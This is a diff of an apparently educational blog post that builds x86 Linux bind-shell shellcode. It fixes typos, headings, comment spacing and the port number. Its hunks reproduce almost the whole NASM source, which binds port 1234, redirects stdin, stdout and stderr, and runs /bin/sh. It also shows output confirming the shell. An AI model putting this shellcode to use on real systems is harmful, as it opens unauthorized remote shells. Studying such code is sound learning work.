@@ -189,7 +189,7 @@ Since EBX is already set to 1 we can simply push its value to the stack
 push ebx
 ```
 
-Now for the last argument AF_INET,  we can take a look at /usr/include/i386-linux-gnu/bits/socket.h
+Now for the last argument AF_INET,  we can take a look at `/usr/include/i386-linux-gnu/bits/socket.h`
 
 What we see is that AF_INET is mapped to PF_INET which has a value of 2.
 
@@ -204,7 +204,7 @@ mov ecx, esp
 int 0x80
 ```
 
-As we know, EAX will now store the return value for our socket. Since we'll need to reuse EAX for the other system calls we'll need to preserve our socket elsewhere. We can dothis by MOV'ing it to EDI.
+As we know, EAX will now store the return value for our socket. Since we'll need to reuse EAX for the other system calls we'll need to preserve our socket elsewhere. We can do this by MOV'ing it to EDI.
 
 ```nasm
 mov edi, eax
@@ -234,7 +234,7 @@ host_addr is a struct, which is basically just a group of variables. We setup th
 
 ```c
 host_addr.sin_family = AF_INET;
-host_addr.sin_port = htons(12345);
+host_addr.sin_port = htons(1234);
 host_addr.sin_addr.s_addr = INADDR_ANY;
 ```
 
@@ -256,7 +256,7 @@ push edx
 Next we'll push our port number to the stack. And since EBX already contains a 2, we can go ahead and push that.
 
 ```nasm
-push word 0x3930
+push word 0xd204
 push bx
 ```
 
@@ -283,7 +283,7 @@ After we execute the bind we go ahead and clear out EAX for use in the next step
 xor eax, eax
 ```
 
-## Configuring the socket to listen
+## Configuring the Socket to Listen
 	
 Once again we'll be using socketcall(), this time with the SYS_LISTEN option (4) along with its two arguments which are our socket and the backlog argument.
 
@@ -332,7 +332,11 @@ int 0x80
 
 Our client socket will be returned into EAX so we'll need to preserve that by moving it out. Since our next step will be redirecting STDIN, STDOUT, and STDERR we can move this into EBX since it will need to be there as an argument for the dup2() syscall. 
 
-## Redirecting STDIN, STDOUT, and STDERR to the client connection
+```nasm
+xchg ebx, eax
+```
+
+## Redirecting STDIN, STDOUT, and STDERR to the Client Connection
 
 Looking at the C code again we can see that we used dup2() for the redirection:
 
@@ -348,7 +352,7 @@ xor ecx, ecx
 mov cl, 0x2
 ```
 
-Now comes the actual loop. We'll be using the JNS instruction which basically means continue to jump to the start of the loop until the signed flag is set. We'll be decrementing our counter register each time, and once -1 is returned the signed flag will get set and break the loop.
+Now comes the actual loop. We'll be using the JNS instruction which basically means continue to jump to the start of the loop until the signed flag is set. We'll be decrementing our counter register each time, and once -1 gets set in ECX, the signed flag will be set and break the loop.
 
 We'll also need the dup2() system call number. Which we can find in `/usr/include/i386-linux-gnu/asm/unistd_32.h` as 63. Converted to hex that gives us 0x3f. 
 
@@ -410,7 +414,7 @@ section .text
 _start:
 
 	
-	;zero out registers
+	;zero out registers for socketcall
 	
 	xor eax, eax
 	xor ebx, ebx
@@ -419,12 +423,12 @@ _start:
 	; Create the socket
 
 	mov al, 0x66 		; socketcall (102)
-	mov bl, 0x1		    ; SYS_SOCKET (1)
-	push ecx		    ; protocol (0)
-	push ebx		    ; SOCK_STREAM (1)
-	push 0x2		    ; AF_INET (2)
+	mov bl, 0x1		; SYS_SOCKET (1)
+	push ecx		; protocol (0)
+	push ebx		; SOCK_STREAM (1)
+	push 0x2		; AF_INET (2)
 	mov ecx, esp		; point ecx to top of stack
-	int 0x80		    ; execute socket
+	int 0x80		; execute socket
 
 	mov edi, eax		; move socket to edi
 
@@ -432,64 +436,65 @@ _start:
 
 	
 	mov al, 0x66		; socketcall (102)
-	pop ebx			    ; SYS_BIND (2)
+	pop ebx			; SYS_BIND (2)
 	xor edx, edx		; zero out edx
-	push edx		    ; INADDRY_ANY (0)
+	push edx		; INADDRY_ANY (0)
 	push word 0xd204	; sin_port = 1234
-	push bx			    ; AF_INET (2)
+	push bx			; AF_INET (2)
 	mov ecx, esp		; point ecx to top of stack
-	push 0x10		    ; sizeof(host_addr)
-	push ecx		    ; pointer to host_addr struct
-	push edi		    ; socketfd
+	push 0x10		; sizeof(host_addr)
+	push ecx		; pointer to host_addr struct
+	push edi		; socketfd
 	mov ecx, esp		; point ecx to top of stack 
-	int 0x80		    ; execute bind
+	int 0x80		; execute bind
 	
 	xor eax, eax		; zero out eax
 
 	; Listen on the socket
 	
-	push eax		    ; backlog (0)
-	push edi		    ; socketfd
+	push eax		; backlog (0)
+	push edi		; socketfd
 	mov ecx, esp		; point ecx to stack
-	inc ebx			    ; increment to 3
-	inc ebx			    ; increment to 4
+	inc ebx			; increment to 3
+	inc ebx			; increment to 4
 	mov al, 0x66		; socketcall (102)
-	int 0x80		    ; execute listen
+	int 0x80		; execute listen
 
 
 	; Accept connections
 
 	xor edx, edx		; zero out edx
-	push edx		    ; NULL
-	push edx		    ; NULL
-	push edi		    ; socketfd
-	inc ebx			    ; SYS_ACCEPT (5)
+	push edx		; NULL
+	push edx		; NULL
+	push edi		; socketfd
+	inc ebx			; SYS_ACCEPT (5)
 	mov ecx, esp		; point ecx to stack
 	mov al, 0x66		; socketcall (102)
-	int 0x80		    ; execute accept
+	int 0x80		; execute accept
 	
 	xchg ebx, eax		; move created client_sock in ebx
 	
-	; Redirect STDIN, STDOUT, and STDERR
+	; Redirect STDIN, STDERR, STDOUT
 
 	xor ecx, ecx		; zero out ecx
 	mov cl, 0x2 		; set the counter
 	
 loop:
 	mov al, 0x3f		; dup2 (63)
-	int 0x80		    ; exec dup2
-	dec ecx			    ; decrement counter
-	jns loop		    ; jump until SF is set
+	int 0x80		; exec dup2
+	dec ecx			; decrement counter
+	jns loop		; jump until SF is set
 
 	; Execute /bin/sh
 
-	push edx		    ; NULL
+	push edx		; NULL
 	push 0x68732f2f		; "hs//"
 	push 0x6e69622f 	; "nib/"
 	mov ebx, esp		; point ebx to stack
 	mov ecx, edx		; NULL
-	mov al, 0xb		    ; execve
-	int 0x80		    ; execute execve
+	mov al, 0xb		; execve
+	int 0x80		; execute execve
+
 ```
 
 
@@ -561,7 +566,7 @@ id
 uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
 ```
 
-#3 Python Script for Configurable Port
+## Python Script for Configurable Port
 
 To make the port configurable I made a simple Python script (which isn't the prettiest but works). The script will output the shellcode with the desired port.
 
